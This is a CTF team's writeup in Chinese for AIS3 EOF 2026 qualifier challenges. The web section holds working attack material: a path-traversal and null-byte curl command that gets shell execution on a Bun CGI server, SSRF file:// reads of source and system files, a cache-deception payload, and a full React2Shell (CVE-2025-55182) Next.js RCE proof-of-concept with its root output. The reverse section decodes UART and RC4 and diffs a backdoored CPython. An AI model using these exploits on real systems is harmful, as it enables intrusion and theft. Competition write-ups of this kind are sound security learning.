---
description: 又趕deadline
title: 2026 EOF qual writeup
pubDate: 2025/12/24 10:30:14
tags:
  -  writeup
categories:
- Daily
---
# AIS3 EOF 2026 Qualification Writeup

Team:再不努力，就會成為山羊的食物

## Welcome
> Solver: Luna

![challenge](https://hackmd.io/_uploads/HkmwclkNZx.png)

題目的 [discord 連結](https://discord.gg/45wxkNeXyY) 會指引加入 AIS3 EOF 伺服器
![discord](https://hackmd.io/_uploads/S1XPqgyE-x.png)

加入伺服器後看到 `資訊` 類別下的 `welcome` 頻道
![welcome](https://hackmd.io/_uploads/BJl7vcx1NZe.png)

根據 `CTFdAuthV2#0532` 機器人的訊息, 得知要產生一個 token 並驗證

1. 先去 CTFd → 個人檔案 → 訪問令牌 生成一個不限時間的 token
![token](https://hackmd.io/_uploads/rymvqxkEZx.png)

2. 交給機器人驗證
![verify](https://hackmd.io/_uploads/H1g7v5g14Ze.png)

3. 取得身分組
![role](https://hackmd.io/_uploads/r17PcgJEWg.png)

得到身分組後, 在 `2026-Qual` 類別中的 `announcement` 的頻道主題, 可以看到被遮蔽的說明文字
![hover](https://hackmd.io/_uploads/B1mD9lJVbe.png)

點開後就是 flag
![flag](https://hackmd.io/_uploads/SJXD9gJ4Ze.png)

> EOF{2026-quals-in-2025}

--- 

## Web

### Bun.PHP

> Solver: soar

主要的程式碼邏輯很短，簡單來說就是他會接收你想用 cgi run 起來的檔案，然後去把它跑起來。

```javascript=
import { $ } from "bun";
import { resolve } from "node:path";

const server = Bun.serve({
    host: "0.0.0.0",
    port: 1337,
    routes: {
        "/": async req => {
            return new Response(null, {
                status: 302,
                headers: { "Location": "/cgi-bin/index.php" },
            });
        },

        "/cgi-bin/:filename": async req => {
            const filename = req.params.filename;
            if (!filename.endsWith(".php")) {
                return new Response(`404\n`, {
                    status: 404,
                    headers: { "Content-Type": "text/plain" },
                });
            }

            const scriptPath = resolve("cgi-bin/" + filename);
            const body = await req.blob();
            const shell = $`${scriptPath} < ${body}`
                .env({
                    REQUEST_METHOD: req.method,
                    QUERY_STRING: new URL(req.url).searchParams.toString(),
                    CONTENT_TYPE: req.headers.get("content-type") ?? "",
                    CONTENT_LENGTH: body ? String(body.size) : "0",
                    SCRIPT_FILENAME: scriptPath,
                    GATEWAY_INTERFACE: "CGI/1.1",
                    SERVER_PROTOCOL: "HTTP/1.1",
                    SERVER_SOFTWARE: "bun-php-server/0.1",
                    REDIRECT_STATUS: "200",
                })
                .nothrow();

            // PHP-CGI outputs headers + body separated by \r\n\r\n
            const output = await shell.text();
            const [rawHeaders, ...rest] = output.split("\r\n\r\n");
            const headers = new Headers();
            for (const line of rawHeaders.split("\r\n")) {
                const [k, v] = line.split(/:\s*/, 2);
                if (k && v) headers.set(k, v);
            }

            const responseBody = rest.join("\r\n\r\n");
            return new Response(responseBody, { headers });
        },
    }
});

console.log(`listening on http://localhost:${server.port}`);

```


filename 是我們可以控制的，可以看到這邊很明顯有個 path traveral

```javascript
const scriptPath = resolve("cgi-bin/" + filename);
```

也就是說我們其實可以任意控制 `scriptPath`
但是有一個白名單檢查，他會限制你的檔案只能是 .php 結尾，但這邊只要用 null byte 就能繞過了。

```javascript=
"/cgi-bin/:filename": async req => {
            const filename = req.params.filename;
            if (!filename.endsWith(".php")) {
                return new Response(`404\n`, {
                    status: 404,
                    headers: { "Content-Type": "text/plain" },
});}
```

然後下兩行

```javascript=
const body = await req.blob();
const shell = $`${scriptPath} < ${body}`
```

會把你的 body 塞到 `scriptPath`，所以我們其實就可以 `../` 到 `/bin/sh` 去執行我們的指令，最後組合起來就變這樣 （塞個 `\r\n\r\n` 讓他從 body 打回來）

* exploit : 

```bash=
curl -v --data-binary $'printf "\\r\\n\\r\\n"; /readflag give me the flag' "https://079a02d40b765778.chal.eof.133773.xyz:20001/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fbin%2Fsh%00.php"

EOF{1_tUrn3d_Bun.PHP_Int0_4_r34l1ty}
```

> EOF{1_tUrn3d_Bun.PHP_Int0_4_r34l1ty}

### CookieMonster Viewer

> Solver : soar

是個黑箱題！先隨便戳戳看～
當我亂給 `/api/templates/meow` 的時候會報錯誤訊息

`Template not found: [WinError 2] The system cannot find the file specified: 'C:\\supersecureyouwillneverguessed\\templates/meow.html'`

但目前看起來沒什麼用？但我們這邊還可以知道他是一台 windows！
然後來看看 `/api/preview` 的功能

```bash=
POST /api/preview HTTP/1.1
Host: chals2.eof.ais3.org:20918
Content-Length: 63
Accept-Language: zh-TW,zh;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://chals2.eof.ais3.org:20918
Referer: http://chals2.eof.ais3.org:20918/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"url":"http://localhost/api/templates/lake","username":"awda"}
```

有個 url 參數？看起來很 ssrf！
用 `file://` 協議讀個 win.ini 看看

```bash=
{"url":"file:///C:/Windows/win.ini","username":"awda"}

HTTP/1.1 200 OK
Server: Werkzeug/3.1.4 Python/3.12.10
Date: Wed, 24 Dec 2025 13:48:31 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 127
Connection: close

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
[Ports]
COM1:=9600,n,8,1
COM2:=9600,n,8,1
```

好耶！那我們可以根據剛剛的路徑來讀原始碼看看！
有~~通到~~找到 app.py 跟 dockerfile

* app.py

```python=
{"url":"file:///C:/supersecureyouwillneverguessed/app.py","username":"awda"}

HTTP/1.1 200 OK
Server: Werkzeug/3.1.4 Python/3.12.10
Date: Wed, 24 Dec 2025 13:50:35 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1263
Connection: close

from flask import Flask, request, send_from_directory, send_file, render_template_string
import subprocess
import os

app = Flask(__name__, static_folder='static')

def get_os():
    import ctypes.wintypes
    v = ctypes.windll.kernel32.GetVersion()
    return f"Windows {v & 0xFF}.{(v >> 8) & 0xFF}"

class User:
    def __init__(self, name):
        self.name = name
    def __str__(self):
        return self.name

@app.route('/')
def index():
    with open('static/index.html', encoding='utf-8') as f:
        return render_template_string(f.read(), os_info=get_os())

@app.route('/api/preview', methods=['POST'])
def preview():
    data = request.get_json()
    url = data.get('url', '')
    user = User(data.get('username', 'Guest'))
    
    result = subprocess.run([r'.\lib\curl.exe', url], capture_output=True, text=True, encoding='utf-8', errors='replace')
    content = result.stdout or result.stderr
    
    try:
        return content.format(user=user)
    except:
        return content

@app.route('/api/templates/<name>')
def get_template(name):
    try:
        return send_file(f'templates/{name}.html')
    except Exception as e:
        return f'Template not found: {e}', 404


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

* dockerfile

```dockerfile=
{"url":"file:///C:/supersecureyouwillneverguessed/dockerfile","username":"awda"}

HTTP/1.1 200 OK
Server: Werkzeug/3.1.4 Python/3.12.10
Date: Wed, 24 Dec 2025 13:51:12 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 811
Connection: close

FROM python:3.12-windowsservercore-ltsc2022

WORKDIR /supersecureyouwillneverguessed

COPY requirements.txt .
RUN python -m pip install --no-cache-dir -r requirements.txt

COPY . .

# First move the flag (while we have write access)
SHELL ["powershell", "-Command"]
RUN $rand = -join ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object {[char]$_}); Move-Item C:\supersecureyouwillneverguessed\flag.txt C:\flag-$rand.txt; attrib +R (Get-Item C:\flag-*.txt).FullName

# Then lock down permissions
SHELL ["cmd", "/S", "/C"]
RUN net user /add appuser && \
    attrib +R C:\supersecureyouwillneverguessed\*.* /S && \
    icacls C:\supersecureyouwillneverguessed /grant appuser:(OI)(CI)(RX) /T && \
    icacls C:\supersecureyouwillneverguessed /deny appuser:(WD,AD,DC)

USER appuser
CMD ["python", "app.py"]
```

我們基本上可以得知要 rce 才能取得 flag 了！
然後 python 裏又有一個 format string 的漏洞在 `content.format(user=user)`，另外我又想到這台竟然是 windows 應該會有 worstfit 的問題！
接著...
接著我就不會串了，雖然賽中有想到這兩個漏洞但我沒有想到要怎麼把它們結合在一起，最後是去讀 `C:\` 的 index allocation 然後 flag 檔名就跑出來了，超酷！

```bash=

{"url":"file:///C:/:$I30:$INDEX_ALLOCATION","username":"awda"}

HTTP/1.1 200 OK
Server: Werkzeug/3.1.4 Python/3.12.10
Date: Wed, 24 Dec 2025 13:55:56 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 247
Connection: close

Boot
bootmgr
BOOTNXT
Documents and Settings
DumpStack.log.tmp
flag-sNfLDScBvoFbxYMQ.txt
inetpub
License.txt
Program Files
Program Files (x86)
ProgramData
Python
supersecureyouwillneverguessed
System Volume Information
Users
WcSandboxState
Windows
```

最後去讀 flag 

```bash=
POST /api/preview HTTP/1.1
Host: chals2.eof.ais3.org:20918
Content-Length: 64
Accept-Language: zh-TW,zh;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://chals2.eof.ais3.org:20918
Referer: http://chals2.eof.ais3.org:20918/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"url":"file:///C:/flag-sNfLDScBvoFbxYMQ.txt","username":"awda"}

HTTP/1.1 200 OK
Server: Werkzeug/3.1.4 Python/3.12.10
Date: Wed, 24 Dec 2025 13:56:30 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 47
Connection: close

EOF{w0rst_f1t_4rg_1nj3ct10n_w/_format_string!}
```

我會想辦法補預期解回來的 ><

> EOF{w0rst_f1t_4rg_1nj3ct10n_w/_format_string!}

### LinkoReco

> Solver: soar

又雙叒叕是黑箱題 （灰箱）
~~於是我決定等提示出來才解這題~~

Hint1. 

```bash=
Kurumi 手滑了不小心掉出了這份使用指南

1. Token 只有在使用者從 local 造訪的時候會顯示
2. 這個服務沒有正確 Token 傳入的時候不會回顯內容，只會告訴你 status code，所以有 token 會更方便使用系統
3. 眼睛睜大一點，你會發現伺服器其實有在記得一些東西，而背景圖片本來應該要被存到的...但這個功能被 ai 寫壞了，/static 的靜態檔案應該要被存到的，但是他們直接走 nginx 跑掉了
4. 在她做滲透測試的時候沒有也不需要 fuzzing / 利用 SSRF 去戳 php fpm service
```

Hint2.
```nginx=
map $request_uri $is_static {
    default 0;
    "~*^/static/.*\.(svg|png|jpg|jpeg|css)$" 1;
}
```


然後會有一個 web 頁面讓你去戳其他的網站，但沒有給 token 的話是只看得到 status code 的。
然後根據提示一，我們可以知道 token 要從 local 訪問才會顯示。
~~然後提示二直接把打的方法告訴你了~~，可以看到 nginx 會對 /static 開頭以及特定附檔名進行快取，這時候我們拿一個 payload 讓這個 web 頁面去戳，然後我們再趕快去一次同樣的網址就可以看到 token 了！

* 在 web 送

```
http://web/static/%2e%2e%2findex.php/meow.css
```

* terminal 趕快去訪問一次

```htmlembedded=
curl -v http://chals1.eof.ais3.org:19080/static/%2e%2e%2findex.php/meow.css -path-as-is

...
    textarea {min-height:100px; resize:vertical;}
    .col {flex:1 1 300px; min-width:220px;}
    .actions {text-align:right; margin-top:8px;}
    button {background:#1f8cff;color:white;padding:10px 16px;border-radius:8px;border:0;cursor:pointer;}
    .small-muted {font-size:12px;color:#666;margin-top:6px}
    .logo {max-width:120px; display:block; margin-bottom:12px;}
  </style>
</head>
<body>
  <div class="container">
    <h1>接続テスト</h1>
    <div class="subtitle">あなたのトークン: 200_OK_FROM_WA1NU7</div> <!--- full access token display, local only --->
    <form method="post">
      <div class="row">
        <div class="col">
          <label for="url">URL</label>
          <input type="text" id="url" name="url" placeholder="https://example.com">
        </div>
      </div>
      <div class="row">
        <div class="col">
...
```

拿到 token 後我們去 fetch 的東西就會有回傳文字了！
題目其實還有給一個 docker-compose.yml 

```docker-compose=
version: '3'
services:
  web:
    image: nginx:latest
    ports:
      - "19080:80"
    volumes:
      - ./conf/default.conf:/etc/nginx/conf.d/default.conf
      - ./src:/var/www/html
    depends_on:
      - php

  php:
    image: php:7.4-fpm
    volumes:
      - ./src:/var/www/html
      - ./flag.txt:/etc/REDACTED_FILENAME.txt # yes, secret.

# static files should be well handled, but seems like only fpm serves it?
```

可以得知 flag 是被掛載在 /etc 底下，但我們不知道檔名。
這時候一樣可以用 `file://` 協議去讀一個檔案 `/proc/self/mounts` 他會記錄掛載的一些資訊。

```bash=
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/YFEXIRUO7Z4OCGQ5KL3WBOLW2A:/var/lib/docker/overlay2/l/XMKYSFOCJX2HFFGV5IWGSFNKNC:/var/lib/docker/overlay2/l/4UZP7SBGXDTFA5UEMMG2OXANJP:/var/lib/docker/overlay2/l/347ZPM3G26K5EFJKDYHUGZDECI:/var/lib/docker/overlay2/l/ZZLPILUDBPWY32C4UIIAF5R7IT:/var/lib/docker/overlay2/l/6W5E5MN7QKH4BHD4X7LZWC6HOI:/var/lib/docker/overlay2/l/YTSBFV7H3YYUBB7YS5EUSOWFJC:/var/lib/docker/overlay2/l/WICBG4ZBSBV7CT45DJAMGHSHLP:/var/lib/docker/overlay2/l/MJIHWQJHN5L5P6O4SMXNTOLZ7O:/var/lib/docker/overlay2/l/FKZ7U5ZEDQ4X3KYIKQHJ5HBOV6:/var/lib/docker/overlay2/l/QY3ZKXBKXVEPWDAASFA5C3Z6RN,upperdir=/var/lib/docker/overlay2/14db2463bbdada42229a3fd8cd7e5cff15002be83531ecbd650a38902acc15bf/diff,workdir=/var/lib/docker/overlay2/14db2463bbdada42229a3fd8cd7e5cff15002be83531ecbd650a38902acc15bf/work 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
sysfs /sys sysfs ro,nosuid,nodev,noexec,relatime 0 0
cgroup /sys/fs/cgroup cgroup2 ro,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot 0 0
mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k,inode64 0 0
/dev/sda1 /etc/ca7_f113.txt ext4 rw,relatime,discard,errors=remount-ro 0 0
/dev/sda1 /etc/resolv.conf ext4 rw,relatime,discard,errors=remount-ro 0 0
/dev/sda1 /etc/hostname ext4 rw,relatime,discard,errors=remount-ro 0 0
/dev/sda1 /etc/hosts ext4 rw,relatime,discard,errors=remount-ro 0 0
/dev/sda1 /var/www/html ext4 rw,relatime,discard,errors=remount-ro 0 0
proc /proc/bus proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/fs proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/irq proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/sys proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/sysrq-trigger proc ro,nosuid,nodev,noexec,relatime 0 0
tmpfs /proc/acpi tmpfs ro,relatime,inode64 0 0
tmpfs /proc/kcore tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
tmpfs /proc/keys tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
tmpfs /proc/timer_list tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
tmpfs /sys/firmware tmpfs ro,relatime,inode64 0 0
```

看到 `/etc/ca7_f113.txt` 這個檔案，去把它讀出來就好！

`EOF{たきな、スイーツ追加！それがないなら……修理？やらないから！}`

> EOF{たきな、スイーツ追加！それがないなら……修理？やらないから！}

---


### 以大方空頭來啦！ :drop_of_blood: 

> Solver: soar

要逆一下前端，但這部分我成為 AI 的奴隸了，我請他幫我逆向 XD

在 `page-a5d5f48bdef4decb.js` 中，用了 `function s(t,e){return t-=138,f()[t]}` 這樣的函式來取得字串。

然後他幫我寫出了一個 decode.js

```javascript=
function p(){let t=["YW5jZ","ZAS0A",...,"的信仰不足","m:px-"];return(p=function(){return t})()}
!function(t,e){let i=I,s=t();for(;;)try{if(parseInt(i(891))/1*(parseInt(i(699))/2)+parseInt(i(945))/3+-parseInt(i(1289))/4*(parseInt(i(1147))/5)+-parseInt(i(1376))/6+parseInt(i(1387))/7+parseInt(i(849))/8*(parseInt(i(598))/9)+-parseInt(i(844))/10===741233)break;s.push(s.shift())}catch(t){s.push(s.shift())}}(p,0);

function I(t,e){return t-=336,p()[t]}

const T = I;

console.log("T(1026):", T(1026));
console.log("T(1298):", T(1298));
console.log("T(912):", T(912));
console.log("B:", T(1267) + T(1399) + T(1138) + T(469) + T(611));

// Print all strings to find potential Action IDs
const fs = require('fs');
let output = "";
for (let i = 336; i < 336 + p().length; i++) {
    try {
        let val = I(i);
        output += i + ": " + val + "\n";
    } catch (e) {}
}
fs.writeFileSync('strings.txt', output);
console.log("Strings written to strings.txt");
```

執行過後

```bash=
soar@universe-3 EOF % node ./decode.js    
T(1026): /api/
T(1298): claim
T(912): POST
B: https://rpc.chainpipes.uk
Strings written to strings.txt
```

連進去過後他說偵測到駭客，並且是用 middleware rewrite 的方式寫到 /error
![image](https://hackmd.io/_uploads/BkkrP_tXZe.png)
但 `/api` 的部分都能正常使用，但好像是假的，隨便 fuzz `/api/target` 跟 `/api/claim` 好像都蠻正常的。

觀察一下他的 header

```bash=
curl https://rpc.chainpipes.uk/ -I
HTTP/2 500 
date: Wed, 24 Dec 2025 14:24:41 GMT
content-type: text/html; charset=utf-8
vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
x-middleware-rewrite: /error
cf-cache-status: DYNAMIC
report-to: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=xs%2FBBN7BCq%2FPzkWxRIEB3IKRfn5l%2FaPot8y5lsYIoHsvX5lDKQJL4xFLmyUTgCx068NXqVTJZ%2F8DQMpGJ5MtkSjzGJMTGz0YezZOp2vbqQ%3D%3D"}]}
nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
server: cloudflare
cf-ray: 9b30c37a3946a9bb-TPE
alt-svc: h3=":443"; ma=86400
```

看到有 next.js 我就想到最近很猛的漏洞 React2Shell (CVE-2025-55182)
去網路隨便載了一個 poc 來用之後。

* poc.py

```python=
# /// script
# dependencies = ["requests"]
# ///
import requests
import sys
import json

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "id"

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
        # If you don't need the command output, you can use this line instead:
        # "_prefix": f"process.mainModule.require('child_process').execSync('{EXECUTABLE}');",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": "x"}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
print(res.status_code)
print(res.text)
```

```bash=
python3 poc.py https://rpc.chainpipes.uk/ "id"

">
  (這個是假的 Cloudflare 頁面<br>純粹是不知道偵測到駭客後要放什麼<br>所以放了這個)
</h1>
<div id="cf-wrapper">
    <div id="cf-error-details" class="p-0">
        <header class="mx-auto pt-10 lg:pt-6 lg:px-8 w-240 lg:w-full mb-8">
            <h1 class="inline-block sm:block sm:mb-2 font-light text-60 lg:text-4xl text-black-dark leading-tight mr-2">
                <span class="inline-block">Internal server error</span>
                <span class="code-label">Error code 500</span>
            </h1>
            <div>
```

誒？！還是被擋了？然後我當初就卡在這邊繞那個檢查，完全忘記 /api 沒被擋這件事，直到 hint 給出 middleware 的實作我才想起來。

```bash=
python3 poc.py https://rpc.chainpipes.uk/api "id"
/Users/soar/Library/Python/3.9/lib/python/site-packages/urllib3/__init__.py:35: NotOpenSSLWarning: urllib3 v2 only supports OpenSSL 1.1.1+, currently the 'ssl' module is compiled with 'LibreSSL 2.8.3'. See: https://github.com/urllib3/urllib3/issues/3020
  warnings.warn(
500
0:{"a":"$@1","f":"","b":"0zhF2SkV4t1SfMdgAlVR9"}
1:E{"digest":"uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)"}
```

好耶！接著讀 flag 就好了

```bash=
python3 poc.py https://rpc.chainpipes.uk/api "cat /flag"
/Users/soar/Library/Python/3.9/lib/python/site-packages/urllib3/__init__.py:35: NotOpenSSLWarning: urllib3 v2 only supports OpenSSL 1.1.1+, currently the 'ssl' module is compiled with 'LibreSSL 2.8.3'. See: https://github.com/urllib3/urllib3/issues/3020
  warnings.warn(
500
0:{"a":"$@1","f":"","b":"0zhF2SkV4t1SfMdgAlVR9"}
1:E{"digest":"EOF{Fr33_EIP7702_Sc43_with_EV3_Supp0r7~}"}
```

這題因為當初卡最後一個地方，所以提示一出來很快拿到首殺 ><

> EOF{Fr33_EIP7702_Sc43_with_EV3_Supp0r7~}


## Reverse
### bored

> Solver : 此情吳計可消除

- `signal.vcd`：只有一條 `UART.data` 的波形變化（0/1）。
- `firmware.bin`：裸機 firmware，內含字串 `Input: `、`Output: `，以及一段固定長度的加密資料。


UART 典型 **8N1**：

- Idle：`1`
- Start bit：`0`
- Data bits：8 bits（**LSB first**）
- Stop bit：`1`


從 VCD 的 timestamp 差值可以看出最小步長接近 `104166 ns`

$$
T_b \approx 104166\ \text{ns},\quad baud \approx \frac{1}{T_b} \approx 9600
$$

對於一個 frame，若 start bit 起點時間為 \(t_0\)，則第 \(i\) 個 data bit（\(i=0..7\)）

$$
t_{\text{sample}}(i)=t_0+(1.5+i)\cdot T_b
$$


```python
bit = 104166 
sample_t = t0 + int((1.5 + i) * bit)
bit_i = value_at(sample_t)
```

因為 LSB first，所以 byte 組成：

$$
\text{byte}=\sum_{i=0}^{7} bit_i\cdot 2^i
$$

```python
b = 0
for i in range(8):
    bit_i = value_at(t0 + int((1.5 + i) * bit))
    b |= (bit_i & 1) << i
out.append(b)
```

把每個 frame 解出來後得到字串：

- **key = `b4r3MEt41`**


在 `firmware.bin` 會看到典型 RC4 特徵：

- 初始化長度 256 的陣列 $(S)$
- 兩個 index $(i,j$)
- 256 次迴圈 swap
- 之後每 byte 都做 swap 並用 $(S[(S[i]+S[j])\bmod 256])$ 當 keystream


$$
S[i]=i,\quad j=0
$$

KSA：

$$
j=(j+S[i]+K[i\bmod |K|])\bmod 256,\quad \text{swap}(S[i],S[j])
$$

```python
S = list(range(256))
j = 0
for i in range(256):
    j = (j + S[i] + key[i % len(key)]) & 0xff
    S[i], S[j] = S[j], S[i]
```

PRGA：

$$
i=(i+1)\bmod 256
$$
$$
j=(j+S[i])\bmod 256
$$
$$
\text{swap}(S[i],S[j])
$$
$$
KS = S[(S[i]+S[j])\bmod 256]
$$


```python
i = 0
j = 0
for c in data:
    i = (i + 1) & 0xff
    j = (j + S[i]) & 0xff
    S[i], S[j] = S[j], S[i]
    ks = S[(S[i] + S[j]) & 0xff]
```

RC4 是 stream cipher，因此：

$$
P_n=C_n\oplus KS_n
$$

```python
out.append(c ^ ks)
```

---


`firmware.bin` 內有 `Input: ` 這個字串。
題目把 ciphertext 放在它前面一小段固定區塊


在 firmware 內搜尋 `b"Input: "`
取它前面一段固定長度當 ciphertext


```python
blob = Path("firmware.bin").read_bytes()

off_input = blob.find(b"Input: ")
assert off_input != -1

cipher_len = 0x1E
cipher_off = off_input - 0x20 
cipher = blob[cipher_off:cipher_off + cipher_len]
```

---

> solve.py
```python
from pathlib import Path
import bisect

BIT_DEFAULT = 104166 

def parse_vcd_uart_bytes(vcd_path: str) -> bytes:
    lines = Path(vcd_path).read_text().splitlines()

    changes = []
    t = 0
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if line.startswith("#"):
            t = int(line[1:])
        elif line.endswith("d") and line[0] in "01":
            changes.append((t, int(line[0])))

    clean = []
    last_v = None
    for tt, vv in changes:
        if last_v is None or vv != last_v:
            clean.append((tt, vv))
            last_v = vv

    if not clean:
        return b""

    times = [tt for tt, _ in clean]
    vals  = [vv for _, vv in clean]

    def value_at(x: int) -> int:
        i = bisect.bisect_right(times, x) - 1
        return vals[i] if i >= 0 else 1  # idle high


    bit = BIT_DEFAULT

    end_time = clean[-1][0] + bit * 20
    starts = []
    tt = 0
    while tt < end_time:
        mid  = value_at(tt + bit // 2)
        prev = value_at(tt - bit // 2) if tt >= bit else 1
        if prev == 1 and mid == 0:
            stop = value_at(tt + int(9.5 * bit))
            if stop == 1:
                starts.append(tt)
                tt += 10 * bit
                continue
        tt += bit

    out = []
    for s in starts:
        b = 0
        for i in range(8):
            bit_i = value_at(s + int((1.5 + i) * bit))
            b |= (bit_i & 1) << i 
        out.append(b)

    return bytes(out)

def rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xff
        S[i], S[j] = S[j], S[i]

    i = 0
    j = 0
    out = bytearray()
    for c in data:
        i = (i + 1) & 0xff
        j = (j + S[i]) & 0xff
        S[i], S[j] = S[j], S[i]
        ks = S[(S[i] + S[j]) & 0xff]
        out.append(c ^ ks)
    return bytes(out)

def main():
    key = parse_vcd_uart_bytes("signal.vcd")
    blob = Path("firmware.bin").read_bytes()

    off_input = blob.find(b"Input: ")
    

    cipher_len = 0x1E  # 30 bytes
    cipher_off = off_input - 0x20
    cipher = blob[cipher_off:cipher_off + cipher_len]

    pt = rc4(key, cipher)

    print("key =", key.decode(errors="replace"))
    print("flag =", pt.decode(errors="replace"))

if __name__ == "__main__":
    main()
```

---

```
[15:46:54] ~/Downloads/dist-bored-cd3d9744e4e7b6884b91a6571654a7fe16f51d99 ➜ python3 solve.py                    
[+] key from VCD: b4r3MEt41
[+] flag: EOF{ExP3d14i0N_33_15_4he_G0AT}
```

---

### Impure

> Solver: 貓貓

```
Someone polluted our private fork of python...
```
下載檔案後解壓縮會有bin、lib資料夾，得知
- Python 版本：Python 3.15.0a2+
- Commit：bef63d2fb81

根據題目可以知道這是被汙染過的python，所以猜測要去利用diff找出不同
用作者的名稱去查，可以看到這些應該是cpython編譯後的東西
![image](https://hackmd.io/_uploads/HJCEr42XZg.png)
而且有看到libpython3.15.a這個檔案，為cpython的靜態函式庫
所以就先去載原本的cpython下來和編譯
```
git clone https://github.com/python/cpython
cd cpython
git checkout bef63d2fb81
```
```
./configure --disable-shared
make -j
```
就一樣得到了原始的libpython3.15.a，利用strings之後的結果做對比
```
strings official/libpython3.15.a > official.txt
strings challenge/libpython3.15.a > chall.txt
diff -u official.txt chall.txt > diff_output.txt
```
發現額外多了以下
```
flag_len
flag_status
flag_obj
flag_buf
```
再用指令找出這些字串在哪個.o檔
```
ar t challenge/libpython3.15.a | while read o; do   ar p 
challenge/libpython3.15.a "$o" | strings -a | grep -qxE 
'flag_(len|status|obj|buf)' && echo "$o"; done
```
得知為`listobject.o`
就把listobject.o抽出來丟到ida和配合組語來看
```
ar x challenge/libpython3.15.a listobject.o
objdump -drwC listobject.o > listobj_output.txt
```
發現相比原版的多了list_poorcompare
用法為`list_poorcompare(PyListObject *self, PyObject *iterable)`
function會做流程會是
1. 將 iterable 轉成 sequence（PySequence_Fast）
2. 強制檢查 iterable 長度必須為 24
3. 將 iterable 的 24 個元素逐一 PyLong_AsLong
4. 與 .rodata+0x2c 的 24 bytes 做比對
5. 若完全一致：
    - 從 .rodata+0x4c 取 24 bytes
    - 每個 byte XOR 0xC4
    - 組成字串並寫入 list

所以把.rodata抽出來另存為bin
```
objcopy --only-section=.rodata -O binary listobject.o rodata.bin
```

之後解碼成功得到flag
```python=
import pathlib

b = pathlib.Path("rodata.bin").read_bytes()

key = b[0x2c:0x2c+0x18]
enc = b[0x4c:0x4c+0x60]   # 一次多抓 0x60 bytes
dec = bytes(x ^ 0xC4 for x in enc)

print("key:", list(key))
print("dec:", dec)
```
![image](https://hackmd.io/_uploads/BJVHfr3Xbg.png)
> EOF{_B4CkD0oR3d_CpYT70N}

---

### Structured - Small
> Solver: Luna

![challenge](https://hackmd.io/_uploads/H1oIigkE-x.png)

解壓縮後, 會出現 10 個相同大小的檔案
![file](https://hackmd.io/_uploads/rJiUsgkV-g.png)


從第 0 個檔案(`small-flag_0`) 開始逆向
其中, `main` 函數的內容是
```c
_BOOL8 __fastcall main(int a1, char **a2, char **a3)
{
  _BOOL8 result; // rax
  char *v4; // rdx
  __int64 v5; // rcx
  char *v6; // rsi
  __int64 v7; // rax

  result = 1;
  if ( a1 > 1 )
  {
    v4 = a2[1];
    v5 = 0;
    v6 = v4 + 8;
    do
    {
      v7 = (unsigned __int8)*v4;
      if ( !(_BYTE)v7 )
        break;
      ++v4;
      v5 = v7 | (v5 << 8);
    }
    while ( v4 != v6 );
    return v5 != 0x74686520666C6167LL;
  }
  return result;
}
```

這段程式碼檢查 8 個字元, 即大端序的 `0x74686520666C6167` = `the flag`
每一個可執行檔案的結構都相同, 唯獨 `return v5` 的值與操作有所不同, 全部手動抽出後依序會得到

```c
return v5 != 0x74686520666C6167LL;
return v5 != 0x20666F7220746869LL;
return v5 != 0x73206368616C6C65LL;
return v5 != 0x6E67652069733A20LL;
return __ROR8__(v5, 24) != 0x545275454F467B35LL;
return v5 != 0x4354755233445F72LL;
return v5 != 0x3356335235335F33LL;
